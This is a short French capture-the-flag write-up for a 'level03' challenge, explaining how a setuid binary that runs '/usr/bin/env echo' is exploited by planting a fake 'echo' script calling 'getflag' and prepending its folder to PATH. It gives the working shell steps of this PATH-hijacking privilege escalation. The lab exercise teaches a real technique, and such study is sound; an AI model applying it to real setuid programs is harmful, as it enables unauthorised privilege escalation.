On peut remarquer dans le dossier de l'utilisateur un fichier `level03` executable qui print "Exploit me" quand on l'execute.
Si on regarde les permissions du fichier,
`-rwsr-sr-x 1 flag03  level03 8.5K Mar  5  2016 level03`
on voit que les autorisations d'execution sont "s" et non "x".

Cela signigie que le fichier est execute avec les permissions de flag03.
Si on analyse simplement l'executable avec strings (`strings level03`), on voit que le print se fait via `/usr/bin/env echo Exploit me`.

Donc ce fichier lance une commande. Il nous suffit donc de modifier là ou pointe "echo", en créant un fichier executable du même nom et contenant un appel à `getflag`, puis d'ajouter le dossier qui le contient au PATH.

```bash
chmod +w .
touch echo
chmod +x echo
export PATH="`pwd`:$PATH"
vim echo
```

Dans vim, on ajoute

```bash
#!/bin/bash

getflag
```

Ensuite, il ne reste plus qu`à executer `./level03`